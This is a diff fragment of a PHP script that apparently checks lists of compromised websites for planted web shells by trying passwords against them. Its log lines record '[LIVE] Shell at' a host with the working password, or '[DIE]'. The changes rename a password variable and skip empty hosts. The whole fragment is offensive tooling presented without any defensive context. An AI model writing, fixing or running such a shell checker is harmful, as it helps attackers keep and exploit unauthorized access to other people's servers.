@@ -78,15 +78,15 @@ function crotz($x)
                         if($results->status == "success")
                         {
                             $end = fopen("shell_result.txt", "a+");
-                            fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$pass);
-                            print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$pass."\n\n";
+                            fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$key);
+                            print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$key."\n\n";
                             fclose($end);
                             break;
                         } else if($results->status == "error")
                         {
                             $end = fopen("shell_die.txt", "a+");
                             fwrite($end, "\n[DIE] Shell at " . $x);
-                            print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
+                            print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$key."\n";
                             fclose($end);
                         }
                     }
@@ -141,7 +141,9 @@ if(strpos($list, ".txt"))
 
     foreach($url as $host)
     {
-        crotz($host);
+            if(!empty($host) && $host != ''){
+                crotz($host);
+            }
     }
 } else if(strpos($list, ".txt") && strpos($list, "|"))
 {
@@ -156,7 +158,9 @@ if(strpos($list, ".txt"))
 
         foreach($url as $host)
         {
-            crotz($host);
+            if(!empty($host) && $host != ''){
+                crotz($host);
+            }
         }
     }
 } else if(strpos($list, "|") && !strpos($list, ".txt"))
